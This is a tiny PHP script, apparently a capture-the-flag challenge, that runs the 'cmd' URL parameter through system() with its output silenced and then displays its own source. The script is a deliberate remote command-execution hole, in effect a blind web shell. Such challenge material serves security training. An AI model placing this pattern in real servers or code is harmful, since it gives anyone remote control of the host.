<?php
//燕子，燕子，没有你我怎么活啊，不要甩开我啊
function hello_shell($cmd){
    system($cmd.">/dev/null 2>&1");
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>
